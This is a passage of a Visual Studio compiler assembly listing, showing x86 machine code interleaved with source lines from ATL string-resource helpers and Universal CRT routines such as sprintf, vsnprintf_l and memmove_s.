  0000f	83 78 0c 00	 cmp	 DWORD PTR [eax+12], 0
  00013	7d 09		 jge	 SHORT $LN3@IsLocked
  00015	c7 45 b8 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  0001c	eb 07		 jmp	 SHORT $LN4@IsLocked
$LN3@IsLocked:
  0001e	c7 45 b8 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@IsLocked:
  00025	8a 45 b8	 mov	 al, BYTE PTR tv66[ebp]

; 70   : 	}

  00028	5f		 pop	 edi
  00029	5e		 pop	 esi
  0002a	5b		 pop	 ebx
  0002b	8b e5		 mov	 esp, ebp
  0002d	5d		 pop	 ebp
  0002e	c3		 ret	 0
?IsLocked@CStringData@ATL@@QBE_NXZ ENDP			; ATL::CStringData::IsLocked
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlsimpstr.h
;	COMDAT ?data@CStringData@ATL@@QAEPAXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?data@CStringData@ATL@@QAEPAXXZ PROC			; ATL::CStringData::data, COMDAT
; _this$ = ecx

; 58   : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 59   : 		return (this+1);

  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	83 c0 10	 add	 eax, 16			; 00000010H

; 60   : 	}

  00012	5f		 pop	 edi
  00013	5e		 pop	 esi
  00014	5b		 pop	 ebx
  00015	8b e5		 mov	 esp, ebp
  00017	5d		 pop	 ebp
  00018	c3		 ret	 0
?data@CStringData@ATL@@QAEPAXXZ ENDP			; ATL::CStringData::data
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlcore.h
;	COMDAT ?AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@I@Z
_TEXT	SEGMENT
_hResource$ = -4					; size = 4
_hInstance$ = 8						; size = 4
_id$ = 12						; size = 4
?AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@I@Z PROC ; ATL::AtlGetStringResourceImage, COMDAT

; 370  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 371  : 	HRSRC hResource;
; 372  : 	/*
; 373  : 		The and operation (& static_cast<WORD>(~0)) protects the expression from being greater
; 374  : 		than WORD - this would cause a runtime error when the application is compiled with /RTCc flag.
; 375  : 	*/
; 376  : 	hResource = ::FindResourceW(hInstance, MAKEINTRESOURCEW( (((id>>4)+1) & static_cast<WORD>(~0)) ), (LPWSTR) RT_STRING);

  00009	6a 06		 push	 6
  0000b	8b 45 0c	 mov	 eax, DWORD PTR _id$[ebp]
  0000e	c1 e8 04	 shr	 eax, 4
  00011	83 c0 01	 add	 eax, 1
  00014	25 ff ff 00 00	 and	 eax, 65535		; 0000ffffH
  00019	0f b7 c8	 movzx	 ecx, ax
  0001c	51		 push	 ecx
  0001d	8b 55 08	 mov	 edx, DWORD PTR _hInstance$[ebp]
  00020	52		 push	 edx
  00021	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__FindResourceW@12
  00027	89 45 fc	 mov	 DWORD PTR _hResource$[ebp], eax

; 377  : 	if( hResource == NULL )

  0002a	83 7d fc 00	 cmp	 DWORD PTR _hResource$[ebp], 0
  0002e	75 04		 jne	 SHORT $LN2@AtlGetStri

; 378  : 	{
; 379  : 		return( NULL );

  00030	33 c0		 xor	 eax, eax
  00032	eb 14		 jmp	 SHORT $LN1@AtlGetStri
$LN2@AtlGetStri:

; 380  : 	}
; 381  : 
; 382  : 	return _AtlGetStringResourceImage( hInstance, hResource, id );

  00034	8b 45 0c	 mov	 eax, DWORD PTR _id$[ebp]
  00037	50		 push	 eax
  00038	8b 4d fc	 mov	 ecx, DWORD PTR _hResource$[ebp]
  0003b	51		 push	 ecx
  0003c	8b 55 08	 mov	 edx, DWORD PTR _hInstance$[ebp]
  0003f	52		 push	 edx
  00040	e8 00 00 00 00	 call	 ?_AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@PAUHRSRC__@@I@Z ; ATL::_AtlGetStringResourceImage
  00045	83 c4 0c	 add	 esp, 12			; 0000000cH
$LN1@AtlGetStri:

; 383  : }

  00048	5f		 pop	 edi
  00049	5e		 pop	 esi
  0004a	5b		 pop	 ebx
  0004b	8b e5		 mov	 esp, ebp
  0004d	5d		 pop	 ebp
  0004e	c3		 ret	 0
?AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@I@Z ENDP ; ATL::AtlGetStringResourceImage
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlcore.h
;	COMDAT ?_AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@PAUHRSRC__@@I@Z
_TEXT	SEGMENT
_iIndex$ = -20						; size = 4
_hGlobal$ = -16						; size = 4
_nResourceSize$ = -12					; size = 4
_pImageEnd$ = -8					; size = 4
_pImage$ = -4						; size = 4
_hInstance$ = 8						; size = 4
_hResource$ = 12					; size = 4
_id$ = 16						; size = 4
?_AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@PAUHRSRC__@@I@Z PROC ; ATL::_AtlGetStringResourceImage, COMDAT

; 327  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 54	 sub	 esp, 84			; 00000054H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 328  : 	const ATLSTRINGRESOURCEIMAGE* pImage;
; 329  : 	const ATLSTRINGRESOURCEIMAGE* pImageEnd;
; 330  : 	ULONG nResourceSize;
; 331  : 	HGLOBAL hGlobal;
; 332  : 	UINT iIndex;
; 333  : 
; 334  : 	hGlobal = ::LoadResource( hInstance, hResource );

  00009	8b 45 0c	 mov	 eax, DWORD PTR _hResource$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR _hInstance$[ebp]
  00010	51		 push	 ecx
  00011	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__LoadResource@8
  00017	89 45 f0	 mov	 DWORD PTR _hGlobal$[ebp], eax

; 335  : 	if( hGlobal == NULL )

  0001a	83 7d f0 00	 cmp	 DWORD PTR _hGlobal$[ebp], 0
  0001e	75 07		 jne	 SHORT $LN4@AtlGetStri

; 336  : 	{
; 337  : 		return( NULL );

  00020	33 c0		 xor	 eax, eax
  00022	e9 80 00 00 00	 jmp	 $LN1@AtlGetStri
$LN4@AtlGetStri:

; 338  : 	}
; 339  : 
; 340  : 	pImage = (const ATLSTRINGRESOURCEIMAGE*)::LockResource( hGlobal );

  00027	8b 45 f0	 mov	 eax, DWORD PTR _hGlobal$[ebp]
  0002a	50		 push	 eax
  0002b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__LockResource@4
  00031	89 45 fc	 mov	 DWORD PTR _pImage$[ebp], eax

; 341  : 	if( pImage == NULL )

  00034	83 7d fc 00	 cmp	 DWORD PTR _pImage$[ebp], 0
  00038	75 04		 jne	 SHORT $LN5@AtlGetStri

; 342  : 	{
; 343  : 		return( NULL );

  0003a	33 c0		 xor	 eax, eax
  0003c	eb 69		 jmp	 SHORT $LN1@AtlGetStri
$LN5@AtlGetStri:

; 344  : 	}
; 345  : 
; 346  : 	nResourceSize = ::SizeofResource( hInstance, hResource );

  0003e	8b 45 0c	 mov	 eax, DWORD PTR _hResource$[ebp]
  00041	50		 push	 eax
  00042	8b 4d 08	 mov	 ecx, DWORD PTR _hInstance$[ebp]
  00045	51		 push	 ecx
  00046	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SizeofResource@8
  0004c	89 45 f4	 mov	 DWORD PTR _nResourceSize$[ebp], eax

; 347  : 	pImageEnd = (const ATLSTRINGRESOURCEIMAGE*)(LPBYTE( pImage )+nResourceSize);

  0004f	8b 45 fc	 mov	 eax, DWORD PTR _pImage$[ebp]
  00052	03 45 f4	 add	 eax, DWORD PTR _nResourceSize$[ebp]
  00055	89 45 f8	 mov	 DWORD PTR _pImageEnd$[ebp], eax

; 348  : 	iIndex = id&0x000f;

  00058	8b 45 10	 mov	 eax, DWORD PTR _id$[ebp]
  0005b	83 e0 0f	 and	 eax, 15			; 0000000fH
  0005e	89 45 ec	 mov	 DWORD PTR _iIndex$[ebp], eax
$LN2@AtlGetStri:

; 349  : 
; 350  : 	while( (iIndex > 0) && (pImage < pImageEnd) )

  00061	83 7d ec 00	 cmp	 DWORD PTR _iIndex$[ebp], 0
  00065	76 23		 jbe	 SHORT $LN3@AtlGetStri
  00067	8b 45 fc	 mov	 eax, DWORD PTR _pImage$[ebp]
  0006a	3b 45 f8	 cmp	 eax, DWORD PTR _pImageEnd$[ebp]
  0006d	73 1b		 jae	 SHORT $LN3@AtlGetStri

; 351  : 	{
; 352  : 		pImage = (const ATLSTRINGRESOURCEIMAGE*)(LPBYTE( pImage )+(sizeof( ATLSTRINGRESOURCEIMAGE )+(pImage->nLength*sizeof( WCHAR ))));

  0006f	8b 45 fc	 mov	 eax, DWORD PTR _pImage$[ebp]
  00072	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  00075	8b 55 fc	 mov	 edx, DWORD PTR _pImage$[ebp]
  00078	8d 44 4a 02	 lea	 eax, DWORD PTR [edx+ecx*2+2]
  0007c	89 45 fc	 mov	 DWORD PTR _pImage$[ebp], eax

; 353  : 		iIndex--;

  0007f	8b 45 ec	 mov	 eax, DWORD PTR _iIndex$[ebp]
  00082	83 e8 01	 sub	 eax, 1
  00085	89 45 ec	 mov	 DWORD PTR _iIndex$[ebp], eax

; 354  : 	}

  00088	eb d7		 jmp	 SHORT $LN2@AtlGetStri
$LN3@AtlGetStri:

; 355  : 	if( pImage >= pImageEnd )

  0008a	8b 45 fc	 mov	 eax, DWORD PTR _pImage$[ebp]
  0008d	3b 45 f8	 cmp	 eax, DWORD PTR _pImageEnd$[ebp]
  00090	72 04		 jb	 SHORT $LN6@AtlGetStri

; 356  : 	{
; 357  : 		return( NULL );

  00092	33 c0		 xor	 eax, eax
  00094	eb 11		 jmp	 SHORT $LN1@AtlGetStri
$LN6@AtlGetStri:

; 358  : 	}
; 359  : 	if( pImage->nLength == 0 )

  00096	8b 45 fc	 mov	 eax, DWORD PTR _pImage$[ebp]
  00099	0f b7 08	 movzx	 ecx, WORD PTR [eax]
  0009c	85 c9		 test	 ecx, ecx
  0009e	75 04		 jne	 SHORT $LN7@AtlGetStri

; 360  : 	{
; 361  : 		return( NULL );

  000a0	33 c0		 xor	 eax, eax
  000a2	eb 03		 jmp	 SHORT $LN1@AtlGetStri
$LN7@AtlGetStri:

; 362  : 	}
; 363  : 
; 364  : 	return( pImage );

  000a4	8b 45 fc	 mov	 eax, DWORD PTR _pImage$[ebp]
$LN1@AtlGetStri:

; 365  : }

  000a7	5f		 pop	 edi
  000a8	5e		 pop	 esi
  000a9	5b		 pop	 ebx
  000aa	8b e5		 mov	 esp, ebp
  000ac	5d		 pop	 ebp
  000ad	c3		 ret	 0
?_AtlGetStringResourceImage@ATL@@YAPBUATLSTRINGRESOURCEIMAGE@1@PAUHINSTANCE__@@PAUHRSRC__@@I@Z ENDP ; ATL::_AtlGetStringResourceImage
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlconv.h
;	COMDAT ?_AtlGetConversionACP@ATL@@YGIXZ
_TEXT	SEGMENT
?_AtlGetConversionACP@ATL@@YGIXZ PROC			; ATL::_AtlGetConversionACP, COMDAT

; 98   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 99   : #ifdef _CONVERSION_DONT_USE_THREAD_LOCALE
; 100  : 	return CP_ACP;
; 101  : #else
; 102  : 	return CP_THREAD_ACP;

  00009	b8 03 00 00 00	 mov	 eax, 3

; 103  : #endif
; 104  : }

  0000e	5f		 pop	 edi
  0000f	5e		 pop	 esi
  00010	5b		 pop	 ebx
  00011	8b e5		 mov	 esp, ebp
  00013	5d		 pop	 ebp
  00014	c3		 ret	 0
?_AtlGetConversionACP@ATL@@YGIXZ ENDP			; ATL::_AtlGetConversionACP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\atlmfc\include\atlexcept.h
;	COMDAT ?AtlThrowImpl@ATL@@YGXJ@Z
_TEXT	SEGMENT
_hr$ = 8						; size = 4
?AtlThrowImpl@ATL@@YGXJ@Z PROC				; ATL::AtlThrowImpl, COMDAT

; 65   : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 66   : 	ATLTRACE(atlTraceException, 0, _T("AtlThrow: hr = 0x%x\n"), hr );
; 67   : #ifdef _AFX
; 68   : 	if( hr == E_OUTOFMEMORY )

  00009	81 7d 08 0e 00
	07 80		 cmp	 DWORD PTR _hr$[ebp], -2147024882 ; 8007000eH
  00010	75 07		 jne	 SHORT $LN2@AtlThrowIm

; 69   : 	{
; 70   : 		AfxThrowMemoryException();

  00012	e8 00 00 00 00	 call	 ?AfxThrowMemoryException@@YGXXZ ; AfxThrowMemoryException

; 71   : 	}

  00017	eb 09		 jmp	 SHORT $LN4@AtlThrowIm
$LN2@AtlThrowIm:

; 72   : 	else
; 73   : 	{
; 74   : 		AfxThrowOleException( hr );

  00019	8b 45 08	 mov	 eax, DWORD PTR _hr$[ebp]
  0001c	50		 push	 eax
  0001d	e8 00 00 00 00	 call	 ?AfxThrowOleException@@YGXJ@Z ; AfxThrowOleException
$LN4@AtlThrowIm:

; 75   : 	}
; 76   : #else
; 77   : 	throw CAtlException( hr );
; 78   : #endif
; 79   : };

  00022	5f		 pop	 edi
  00023	5e		 pop	 esi
  00024	5b		 pop	 ebx
  00025	8b e5		 mov	 esp, ebp
  00027	5d		 pop	 ebp
  00028	c2 04 00	 ret	 4
?AtlThrowImpl@ATL@@YGXJ@Z ENDP				; ATL::AtlThrowImpl
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\time.h
;	COMDAT _time
_TEXT	SEGMENT
__Time$ = 8						; size = 4
_time	PROC						; COMDAT

; 535  :         {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 536  :             return _time64(_Time);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Time$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 __time64
  00012	83 c4 04	 add	 esp, 4

; 537  :         }

  00015	5f		 pop	 edi
  00016	5e		 pop	 esi
  00017	5b		 pop	 ebx
  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
_time	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\stdio.h
;	COMDAT _sprintf
_TEXT	SEGMENT
__ArgList$ = -8						; size = 4
__Result$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__Format$ = 12						; size = 4
_sprintf PROC						; COMDAT

; 1781 :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 4c	 sub	 esp, 76			; 0000004cH
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 1782 :         int _Result;
; 1783 :         va_list _ArgList;
; 1784 :         __crt_va_start(_ArgList, _Format);

  00009	8d 45 10	 lea	 eax, DWORD PTR __Format$[ebp+4]
  0000c	89 45 f8	 mov	 DWORD PTR __ArgList$[ebp], eax

; 1785 : 
; 1786 :         #pragma warning(push)
; 1787 :         #pragma warning(disable: 4996) // Deprecation
; 1788 :         _Result = _vsprintf_l(_Buffer, _Format, NULL, _ArgList);

  0000f	8b 45 f8	 mov	 eax, DWORD PTR __ArgList$[ebp]
  00012	50		 push	 eax
  00013	6a 00		 push	 0
  00015	8b 4d 0c	 mov	 ecx, DWORD PTR __Format$[ebp]
  00018	51		 push	 ecx
  00019	8b 55 08	 mov	 edx, DWORD PTR __Buffer$[ebp]
  0001c	52		 push	 edx
  0001d	e8 00 00 00 00	 call	 __vsprintf_l
  00022	83 c4 10	 add	 esp, 16			; 00000010H
  00025	89 45 fc	 mov	 DWORD PTR __Result$[ebp], eax

; 1789 :         #pragma warning(pop)
; 1790 : 
; 1791 :         __crt_va_end(_ArgList);

  00028	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR __ArgList$[ebp], 0

; 1792 :         return _Result;

  0002f	8b 45 fc	 mov	 eax, DWORD PTR __Result$[ebp]

; 1793 :     }

  00032	5f		 pop	 edi
  00033	5e		 pop	 esi
  00034	5b		 pop	 ebx
  00035	8b e5		 mov	 esp, ebp
  00037	5d		 pop	 ebp
  00038	c3		 ret	 0
_sprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\stdio.h
;	COMDAT __vsprintf_l
_TEXT	SEGMENT
__Buffer$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vsprintf_l PROC					; COMDAT

; 1459 :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 1460 :         #pragma warning(push)
; 1461 :         #pragma warning(disable: 4996) // Deprecation
; 1462 :         return _vsnprintf_l(_Buffer, (size_t)-1, _Format, _Locale, _ArgList);

  00009	8b 45 14	 mov	 eax, DWORD PTR __ArgList$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 10	 mov	 ecx, DWORD PTR __Locale$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 0c	 mov	 edx, DWORD PTR __Format$[ebp]
  00014	52		 push	 edx
  00015	6a ff		 push	 -1
  00017	8b 45 08	 mov	 eax, DWORD PTR __Buffer$[ebp]
  0001a	50		 push	 eax
  0001b	e8 00 00 00 00	 call	 __vsnprintf_l
  00020	83 c4 14	 add	 esp, 20			; 00000014H

; 1463 :         #pragma warning(pop)
; 1464 :     }

  00023	5f		 pop	 edi
  00024	5e		 pop	 esi
  00025	5b		 pop	 ebx
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
__vsprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\stdio.h
;	COMDAT __vsnprintf_l
_TEXT	SEGMENT
tv74 = -72						; size = 4
__Result$ = -4						; size = 4
__Buffer$ = 8						; size = 4
__BufferCount$ = 12					; size = 4
__Format$ = 16						; size = 4
__Locale$ = 20						; size = 4
__ArgList$ = 24						; size = 4
__vsnprintf_l PROC					; COMDAT

; 1389 :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 1390 :         int const _Result = __stdio_common_vsprintf(

  00009	8b 45 18	 mov	 eax, DWORD PTR __ArgList$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 14	 mov	 ecx, DWORD PTR __Locale$[ebp]
  00010	51		 push	 ecx
  00011	8b 55 10	 mov	 edx, DWORD PTR __Format$[ebp]
  00014	52		 push	 edx
  00015	8b 45 0c	 mov	 eax, DWORD PTR __BufferCount$[ebp]
  00018	50		 push	 eax
  00019	8b 4d 08	 mov	 ecx, DWORD PTR __Buffer$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ___local_stdio_printf_options
  00022	8b 10		 mov	 edx, DWORD PTR [eax]
  00024	83 ca 01	 or	 edx, 1
  00027	8b 40 04	 mov	 eax, DWORD PTR [eax+4]
  0002a	50		 push	 eax
  0002b	52		 push	 edx
  0002c	e8 00 00 00 00	 call	 ___stdio_common_vsprintf
  00031	83 c4 1c	 add	 esp, 28			; 0000001cH
  00034	89 45 fc	 mov	 DWORD PTR __Result$[ebp], eax

; 1391 :             _CRT_INTERNAL_LOCAL_PRINTF_OPTIONS | _CRT_INTERNAL_PRINTF_LEGACY_VSPRINTF_NULL_TERMINATION,
; 1392 :             _Buffer, _BufferCount, _Format, _Locale, _ArgList);
; 1393 : 
; 1394 :         return _Result < 0 ? -1 : _Result;

  00037	83 7d fc 00	 cmp	 DWORD PTR __Result$[ebp], 0
  0003b	7d 09		 jge	 SHORT $LN3@vsnprintf_
  0003d	c7 45 b8 ff ff
	ff ff		 mov	 DWORD PTR tv74[ebp], -1
  00044	eb 06		 jmp	 SHORT $LN4@vsnprintf_
$LN3@vsnprintf_:
  00046	8b 45 fc	 mov	 eax, DWORD PTR __Result$[ebp]
  00049	89 45 b8	 mov	 DWORD PTR tv74[ebp], eax
$LN4@vsnprintf_:
  0004c	8b 45 b8	 mov	 eax, DWORD PTR tv74[ebp]

; 1395 :     }

  0004f	5f		 pop	 edi
  00050	5e		 pop	 esi
  00051	5b		 pop	 ebx
  00052	8b e5		 mov	 esp, ebp
  00054	5d		 pop	 ebp
  00055	c3		 ret	 0
__vsnprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\corecrt_stdio_config.h
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT

; 86   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 87   :         static unsigned __int64 _OptionsStorage;
; 88   :         return &_OptionsStorage;

  00009	b8 00 00 00 00	 mov	 eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@4_KA ; `__local_stdio_printf_options'::`2'::_OptionsStorage

; 89   :     }

  0000e	5f		 pop	 edi
  0000f	5e		 pop	 esi
  00010	5b		 pop	 ebx
  00011	8b e5		 mov	 esp, ebp
  00013	5d		 pop	 ebp
  00014	c3		 ret	 0
___local_stdio_printf_options ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\corecrt_memcpy_s.h
;	COMDAT _memmove_s
_TEXT	SEGMENT
tv74 = -80						; size = 4
tv70 = -80						; size = 4
tv66 = -80						; size = 4
__Expr_val$1 = -12					; size = 4
__Expr_val$2 = -8					; size = 4
__Expr_val$3 = -4					; size = 4
__Destination$ = 8					; size = 4
__DestinationSize$ = 12					; size = 4
__Source$ = 16						; size = 4
__SourceSize$ = 20					; size = 4
_memmove_s PROC						; COMDAT

; 70   :     {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 50	 sub	 esp, 80			; 00000050H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 71   :         if (_SourceSize == 0)

  00009	83 7d 14 00	 cmp	 DWORD PTR __SourceSize$[ebp], 0
  0000d	75 07		 jne	 SHORT $LN2@memmove_s

; 72   :         {
; 73   :             return 0;

  0000f	33 c0		 xor	 eax, eax
  00011	e9 c6 00 00 00	 jmp	 $LN1@memmove_s
$LN2@memmove_s:

; 74   :         }
; 75   : 
; 76   :         _CRT_MEMCPY_S_VALIDATE_RETURN_ERRCODE(_Destination != NULL,            EINVAL);

  00016	83 7d 08 00	 cmp	 DWORD PTR __Destination$[ebp], 0
  0001a	74 09		 je	 SHORT $LN7@memmove_s
  0001c	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00023	eb 07		 jmp	 SHORT $LN8@memmove_s
$LN7@memmove_s:
  00025	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN8@memmove_s:
  0002c	8b 45 b0	 mov	 eax, DWORD PTR tv66[ebp]
  0002f	89 45 fc	 mov	 DWORD PTR __Expr_val$3[ebp], eax
  00032	83 7d fc 00	 cmp	 DWORD PTR __Expr_val$3[ebp], 0
  00036	75 1a		 jne	 SHORT $LN3@memmove_s
  00038	e8 00 00 00 00	 call	 __errno
  0003d	c7 00 16 00 00
	00		 mov	 DWORD PTR [eax], 22	; 00000016H
  00043	e8 00 00 00 00	 call	 __invalid_parameter_noinfo
  00048	b8 16 00 00 00	 mov	 eax, 22			; 00000016H
  0004d	e9 8a 00 00 00	 jmp	 $LN1@memmove_s
$LN3@memmove_s:

; 77   :         _CRT_MEMCPY_S_VALIDATE_RETURN_ERRCODE(_Source != NULL,                 EINVAL);

  00052	83 7d 10 00	 cmp	 DWORD PTR __Source$[ebp], 0
  00056	74 09		 je	 SHORT $LN9@memmove_s
  00058	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv70[ebp], 1
  0005f	eb 07		 jmp	 SHORT $LN10@memmove_s
$LN9@memmove_s:
  00061	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv70[ebp], 0
$LN10@memmove_s:
  00068	8b 45 b0	 mov	 eax, DWORD PTR tv70[ebp]
  0006b	89 45 f8	 mov	 DWORD PTR __Expr_val$2[ebp], eax
  0006e	83 7d f8 00	 cmp	 DWORD PTR __Expr_val$2[ebp], 0
  00072	75 17		 jne	 SHORT $LN4@memmove_s
  00074	e8 00 00 00 00	 call	 __errno
  00079	c7 00 16 00 00
	00		 mov	 DWORD PTR [eax], 22	; 00000016H
  0007f	e8 00 00 00 00	 call	 __invalid_parameter_noinfo
  00084	b8 16 00 00 00	 mov	 eax, 22			; 00000016H
  00089	eb 51		 jmp	 SHORT $LN1@memmove_s
$LN4@memmove_s:

; 78   :         _CRT_MEMCPY_S_VALIDATE_RETURN_ERRCODE(_DestinationSize >= _SourceSize, ERANGE);

  0008b	8b 45 0c	 mov	 eax, DWORD PTR __DestinationSize$[ebp]
  0008e	3b 45 14	 cmp	 eax, DWORD PTR __SourceSize$[ebp]
  00091	72 09		 jb	 SHORT $LN11@memmove_s
  00093	c7 45 b0 01 00
	00 00		 mov	 DWORD PTR tv74[ebp], 1
  0009a	eb 07		 jmp	 SHORT $LN12@memmove_s
$LN11@memmove_s:
  0009c	c7 45 b0 00 00
	00 00		 mov	 DWORD PTR tv74[ebp], 0
$LN12@memmove_s:
  000a3	8b 4d b0	 mov	 ecx, DWORD PTR tv74[ebp]
  000a6	89 4d f4	 mov	 DWORD PTR __Expr_val$1[ebp], ecx
  000a9	83 7d f4 00	 cmp	 DWORD PTR __Expr_val$1[ebp], 0
  000ad	75 17		 jne	 SHORT $LN5@memmove_s
  000af	e8 00 00 00 00	 call	 __errno
  000b4	c7 00 22 00 00
	00		 mov	 DWORD PTR [eax], 34	; 00000022H
  000ba	e8 00 00 00 00	 call	 __invalid_parameter_noinfo
  000bf	b8 22 00 00 00	 mov	 eax, 34			; 00000022H
  000c4	eb 16		 jmp	 SHORT $LN1@memmove_s
$LN5@memmove_s:

; 79   : 
; 80   : #pragma warning(suppress:4996) // Deprecation
; 81   :         memmove(_Destination, _Source, _SourceSize);

  000c6	8b 45 14	 mov	 eax, DWORD PTR __SourceSize$[ebp]
  000c9	50		 push	 eax
  000ca	8b 4d 10	 mov	 ecx, DWORD PTR __Source$[ebp]
  000cd	51		 push	 ecx
  000ce	8b 55 08	 mov	 edx, DWORD PTR __Destination$[ebp]
  000d1	52		 push	 edx
  000d2	e8 00 00 00 00	 call	 _memmove
  000d7	83 c4 0c	 add	 esp, 12			; 0000000cH

; 82   :         return 0;

  000da	33 c0		 xor	 eax, eax
$LN1@memmove_s:

; 83   :     }

  000dc	5f		 pop	 edi
  000dd	5e		 pop	 esi
  000de	5b		 pop	 ebx
  000df	8b e5		 mov	 esp, ebp
  000e1	5d		 pop	 ebp
  000e2	c3		 ret	 0
_memmove_s ENDP
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.18362.0\ucrt\corecrt_memcpy_s.h
;	COMDAT _memcpy_s
_TEXT	SEGMENT
tv79 = -80						; size = 4
tv75 = -80						; size = 4
tv66 = -80						; size = 4
__Expr_val$1 = -12					; size = 4
__Expr_val$2 = -8					; size = 4
__Expr_val$3 = -4					; size = 4
